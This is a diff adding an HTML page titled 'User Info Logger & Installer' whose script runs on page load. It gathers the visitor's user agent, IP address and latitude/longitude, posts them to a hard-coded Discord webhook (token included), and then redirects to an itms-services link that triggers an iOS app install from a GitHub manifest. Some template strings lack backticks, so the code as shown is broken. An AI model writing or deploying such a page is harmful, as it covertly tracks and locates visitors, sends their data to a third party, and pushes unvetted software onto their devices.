@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>User Info Logger & Installer</title>
+</head>
+<body>
+  <h1>Logging & Prompting Install</h1>
+  <script>
+    async function sendInfoAndInstall() {
+      const userAgent = navigator.userAgent;
+      let ip = "unknown";
+      let coords = "unknown";
+
+      try {
+        const res = await fetch("https://ipapi.co/json/");
+        const data = await res.json();
+        ip = data.ip || "unknown";
+        coords = Latitude: ${data.latitude}, Longitude: ${data.longitude};
+      } catch (e) {
+        console.error("Geo/IP fetch failed:", e);
+      }
+
+      await fetch("https://discord.com/api/webhooks/1396597523963183206/owIYuIBgQW22F7OH_3msaO0w9ctvHmJvHby0S5dvQXBRzFNsiHgAkri02R6kyHX0BYJp", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          content: User Agent: ${userAgent}\nIP: ${ip}\nCoords: ${coords}
+        })
+      });
+
+      // Redirect to installation URL
+      window.location.href = "itms-services://?action=download-manifest&url=https://raw.githubusercontent.com/nexus-hub10/NEXUS-s-repo/refs/heads/main/TERMINAL.plist";
+    }
+
+    sendInfoAndInstall();
+  </script>
+</body>
+</html>
+
